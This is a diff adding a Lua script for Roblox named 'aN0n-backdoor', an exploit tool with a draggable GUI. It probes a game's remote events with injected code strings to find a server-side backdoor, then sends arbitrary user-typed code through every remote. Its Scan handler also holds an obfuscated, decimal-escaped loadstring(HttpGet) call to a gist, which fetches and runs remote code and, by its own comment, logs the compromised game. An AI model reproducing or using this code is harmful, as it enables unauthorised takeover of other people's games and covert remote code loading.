@@ -1,0 +1,409 @@
+--[[
+________  ________   ________  ________                  ________  ________  ________  ___  __    ________  ________  ________  ________     
+|\   __  \|\   ___  \|\   __  \|\   ___  \               |\   __  \|\   __  \|\   ____\|\  \|\  \ |\   ___ \|\   __  \|\   __  \|\   __  \    
+\ \  \|\  \ \  \\ \  \ \  \|\  \ \  \\ \  \  ____________\ \  \|\ /\ \  \|\  \ \  \___|\ \  \/  /|\ \  \_|\ \ \  \|\  \ \  \|\  \ \  \|\  \   
+ \ \   __  \ \  \\ \  \ \  \\\  \ \  \\ \  \|\____________\ \   __  \ \   __  \ \  \    \ \   ___  \ \  \ \\ \ \  \\\  \ \  \\\  \ \   _  _\  
+  \ \  \ \  \ \  \\ \  \ \  \\\  \ \  \\ \  \|____________|\ \  \|\  \ \  \ \  \ \  \____\ \  \\ \  \ \  \_\\ \ \  \\\  \ \  \\\  \ \  \\  \| 
+   \ \__\ \__\ \__\\ \__\ \_______\ \__\\ \__\              \ \_______\ \__\ \__\ \_______\ \__\\ \__\ \_______\ \_______\ \_______\ \__\\ _\ 
+    \|__|\|__|\|__| \|__|\|_______|\|__| \|__|               \|_______|\|__|\|__|\|_______|\|__| \|__|\|_______|\|_______|\|_______|\|__|\|__|
+    
+    > VERSION: V1.0.0
+    > JOIN our discord server: discord.gg/2EcP3fkzRJ
+    > Thanks for using aN0n-backdoor! more updates coming soon as possible...
+    
+]]
+
+
+-------------// services \\-------------
+
+local CollectionService = game:GetService("CollectionService")
+local TextService = game:GetService("TextService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local JointsService = game:GetService("JointsService")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local ServerScriptService = game:GetService("ServerScriptService")
+local ServerStorage = game:GetService("ServerStorage")
+local SoundService = game:GetService("SoundService")
+local StarterPack = game:GetService("StarterPack")
+local dateTimeNow = DateTime.now
+local tableFind = table.find
+local taskSpawn = task.spawn
+local taskWait = task.wait
+local stringRep = string.rep
+local mathRandom = math.random
+local attached = false;
+local backdoor = nil;
+local commonPlaces = {
+	ReplicatedStorage,
+	Workspace,
+	Lighting
+};
+local remoteCodes = {};
+local STRING_VALUE_NAME = mathRandom(1000000, 9999999);
+
+
+-------------// aN0n-backdoor gui \\-------------
+
+local G2L = {};
+G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui").LocalPlayer:WaitForChild("RobloxGui"));
+G2L["1"]["DisplayOrder"] = 999999999;
+G2L["1"]["Name"] = [[aN0n-backdoor]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1"]["ResetOnSpawn"] = false;
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
+G2L["2"]["Size"] = UDim2.new(0, 549, 0, 28);
+G2L["2"]["Position"] = UDim2.new(0.22348, 0, 0.13821, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Name"] = [[topbar]];
+G2L["3"] = Instance.new("LocalScript", G2L["2"]);
+G2L["3"]["Name"] = [[Dragify]];
+G2L["4"] = Instance.new("TextLabel", G2L["2"]);
+G2L["4"]["TextWrapped"] = true;
+G2L["4"]["BorderSizePixel"] = 0;
+G2L["4"]["TextSize"] = 19;
+G2L["4"]["TextTransparency"] = 0.2;
+G2L["4"]["TextScaled"] = true;
+G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4"]["BackgroundTransparency"] = 1;
+G2L["4"]["Size"] = UDim2.new(0, 200, 0, 18);
+G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["Text"] = [[aN0n-backdoor]];
+G2L["4"]["Name"] = [[title]];
+G2L["4"]["Position"] = UDim2.new(0.31694, 0, 0.11264, 0);
+G2L["5"] = Instance.new("ImageButton", G2L["2"]);
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["BackgroundTransparency"] = 1;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5"]["Image"] = [[rbxassetid://82235228007110]];
+G2L["5"]["Size"] = UDim2.new(0, 24, 0, 28);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Name"] = [[minimize]];
+G2L["5"]["Position"] = UDim2.new(0.94536, 0, -0.05737, 0);
+G2L["6"] = Instance.new("LocalScript", G2L["5"]);
+G2L["7"] = Instance.new("UICorner", G2L["2"]);
+G2L["7"]["CornerRadius"] = UDim.new(0, 4);
+G2L["8"] = Instance.new("Frame", G2L["2"]);
+G2L["8"]["BorderSizePixel"] = 0;
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
+G2L["8"]["Size"] = UDim2.new(0, 549, 0, 270);
+G2L["8"]["Position"] = UDim2.new(0, 0, 0.98109, 0);
+G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["Name"] = [[executor]];
+G2L["9"] = Instance.new("ScrollingFrame", G2L["8"]);
+G2L["9"]["BorderSizePixel"] = 0;
+G2L["9"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34);
+G2L["9"]["ClipsDescendants"] = false;
+G2L["9"]["Size"] = UDim2.new(0, 537, 0, 207);
+G2L["9"]["ScrollBarImageColor3"] = Color3.fromRGB(58, 58, 58);
+G2L["9"]["Position"] = UDim2.new(0.01093, 0, 0.02784, 0);
+G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["ScrollBarThickness"] = 4;
+G2L["9"]["BackgroundTransparency"] = 0.6;
+G2L["a"] = Instance.new("TextBox", G2L["9"]);
+G2L["a"]["Name"] = [[input]];
+G2L["a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["a"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a"]["BorderSizePixel"] = 0;
+G2L["a"]["TextSize"] = 14;
+G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
+G2L["a"]["RichText"] = true;
+G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a"]["MultiLine"] = true;
+G2L["a"]["ClearTextOnFocus"] = false;
+G2L["a"]["PlaceholderText"] = [[print("aN0n-backdoor | inspired on backdoor.exe & FraktureSS")]];
+G2L["a"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["a"]["Position"] = UDim2.new(0.011, 0, 0, 2);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["Text"] = [[]];
+G2L["a"]["BackgroundTransparency"] = 1;
+G2L["b"] = Instance.new("UICorner", G2L["a"]);
+G2L["b"]["CornerRadius"] = UDim.new(0, 2);
+G2L["c"] = Instance.new("TextButton", G2L["8"]);
+G2L["c"]["BorderSizePixel"] = 0;
+G2L["c"]["TextSize"] = 22;
+G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
+G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c"]["Size"] = UDim2.new(0, 162, 0, 38);
+G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c"]["Text"] = [[Execute]];
+G2L["c"]["Position"] = UDim2.new(0.01093, 0, 0.82968, 0);
+G2L["d"] = Instance.new("UICorner", G2L["c"]);
+G2L["d"]["CornerRadius"] = UDim.new(0, 2);
+G2L["e"] = Instance.new("LocalScript", G2L["c"]);
+G2L["f"] = Instance.new("TextButton", G2L["8"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["TextSize"] = 22;
+G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
+G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f"]["Size"] = UDim2.new(0, 159, 0, 38);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f"]["Text"] = [[Clear]];
+G2L["f"]["Position"] = UDim2.new(0.31694, 0, 0.82968, 0);
+G2L["10"] = Instance.new("UICorner", G2L["f"]);
+G2L["10"]["CornerRadius"] = UDim.new(0, 2);
+G2L["11"] = Instance.new("LocalScript", G2L["f"]);
+G2L["12"] = Instance.new("TextButton", G2L["8"]);
+G2L["12"]["BorderSizePixel"] = 0;
+G2L["12"]["TextSize"] = 22;
+G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
+G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12"]["Size"] = UDim2.new(0, 204, 0, 38);
+G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12"]["Text"] = [[Scan]];
+G2L["12"]["Position"] = UDim2.new(0.61749, 0, 0.82968, 0);
+G2L["13"] = Instance.new("UICorner", G2L["12"]);
+G2L["13"]["CornerRadius"] = UDim.new(0, 2);
+G2L["14"] = Instance.new("LocalScript", G2L["12"]);
+G2L["15"] = Instance.new("UICorner", G2L["8"]);
+G2L["15"]["CornerRadius"] = UDim.new(0, 0);
+G2L["16"] = Instance.new("Frame", G2L["2"]);
+G2L["16"]["BorderSizePixel"] = 0;
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(0, 140, 0);
+G2L["16"]["Size"] = UDim2.new(0, 549, 0, 2);
+G2L["16"]["Position"] = UDim2.new(0, 0, 0.95879, 0);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["Name"] = [[outline]];
+G2L["17"] = Instance.new("LocalScript", G2L["1"]);
+G2L["17"]["Name"] = [[Notify]];
+
+
+-------------// functions \\-------------
+
+local function notify(text)
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "aN0n-backdoor",
+		duration = 3,
+		Text = text
+	})
+end
+
+
+local function validRemote(rm)
+	local Parent = rm.Parent
+	local class = rm.ClassName
+	if class ~= "RemoteEvent" and class ~= "RemoteFunction" and class ~= "BindableEvent"  and class ~= "BindableFunction" then return false end
+
+	if Parent then
+		if Parent == JointsService then return false end
+		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+			(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+	end
+
+	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+
+	return true
+end
+
+local function scanDescendants(parent)
+	local descendance = parent:GetDescendants();
+	for i=1, #descendance do
+		local descendant = descendance[i];
+
+
+		if not validRemote(descendant) then continue; end
+
+		local remoteCode = tostring(mathRandom(100000, 999999));
+		remoteCodes[remoteCode] = descendant;
+
+		local remoteClass = descendant.ClassName
+		local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
+
+		if remoteClass == "RemoteEvent" then
+			descendant:FireServer(requireScript)
+
+		elseif remoteClass == "RemoteFunction" then
+			local waiting = true
+			taskSpawn(function()
+				descendant:InvokeServer(requireScript)
+				waiting = nil
+			end)
+
+
+			local start = dateTimeNow().UnixTimestampMillis
+			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+				taskWait()
+			end
+		end
+
+		if Workspace:FindFirstChild(STRING_VALUE_NAME) then
+			attached = true
+			backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
+			backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
+
+			return true
+		end
+	end
+end
+
+local function scanGame()
+	notify("Scanning for backdoors...")
+	local found = false
+
+	for i=1, #commonPlaces do
+		local place = commonPlaces[i];
+		if scanDescendants(place) then
+			found = true
+		end
+	end
+
+	local children = game:GetChildren();
+	for i=1, #children do
+		local child = children[i];
+		if tableFind(commonPlaces, child) then continue; end
+
+		if scanDescendants(child) then 
+			found = true
+		end
+	end
+
+	if found then
+		notify("Backdoor found!")
+	else
+		notify("No backdoors found.")
+	end
+
+	return found;
+end
+
+
+-------------// scripts & buttons \\-------------
+
+local function C_3()
+local script = G2L["3"];
+	local UserInputService = game:GetService("UserInputService")
+	local runService = (game:GetService("RunService"));
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function Lerp(a, b, m)
+		return a + (b - a) * m
+	end;
+	
+	local lastMousePos
+	local lastGoalPos
+	local DRAG_SPEED = (20.5 / 6);
+	local function Update(dt)
+		if not (startPos) then return end;
+		if not (dragging) and (lastGoalPos) then
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+			return 
+		end;
+	
+		local delta = (lastMousePos - UserInputService:GetMouseLocation())
+		local xGoal = (startPos.X.Offset - delta.X);
+		local yGoal = (startPos.Y.Offset - delta.Y);
+		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+	end;
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			lastMousePos = UserInputService:GetMouseLocation()
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	runService.Heartbeat:Connect(Update)
+end;
+task.spawn(C_3);
+
+local function C_6()
+local script = G2L["6"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.executor.Visible = not script.Parent.Parent.executor.Visible
+	end)
+end;
+task.spawn(C_6);
+
+local function C_e()
+local script = G2L["e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		if script.Parent.Parent.ScrollingFrame.input.Text ~= "" then	
+			pcall(function()	
+				for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
+					if obj:IsA("RemoteEvent") then
+						obj:FireServer(script.Parent.Parent.ScrollingFrame.input.Text)
+					elseif obj:IsA("RemoteFunction") then
+						obj:InvokeServer(script.Parent.Parent.ScrollingFrame.input.Text)
+					elseif obj:IsA("Script") then
+						obj:InvokeServer(script.Parent.Parent.ScrollingFrame.input.Text)
+					elseif obj:IsA("LocalScript") then
+						obj:InvokeServer(script.Parent.Parent.ScrollingFrame.input.Text)
+					elseif obj:IsA("ModuleScript") then
+						obj:InvokeServer(script.Parent.Parent.ScrollingFrame.input.Text)
+					end
+				end
+			end)	
+		end
+	end)
+end;
+task.spawn(C_e);
+
+local function C_11()
+local script = G2L["11"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.ScrollingFrame.input.Text = ""
+	end)
+end;
+task.spawn(C_11);
+
+local function C_14()
+local script = G2L["14"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local success, result = pcall(scanGame)
+		task.wait(2.2)
+		if not attached then
+			if success and result == true then
+				loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\97\78\48\110\45\105\115\103\111\111\100\47\100\55\50\100\97\55\53\101\100\98\101\49\48\55\48\56\48\54\102\102\99\101\98\51\56\100\55\50\51\56\54\99\47\114\97\119\47\103\105\115\116\102\105\108\101\49\46\116\120\116"))()
+				-- [ If you don't want your game to be logged, just remove the loadstring line ] --
+			end
+		end
+	end)
+end;
+task.spawn(C_14);
+
+local function C_17()
+local script = G2L["17"];
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "aN0n-backdoor",
+		Text = "aN0n-backdoor successfully loaded.",
+		Duration = 5
+	})
+end;
+task.spawn(C_17);
+
+return G2L["1"], require;
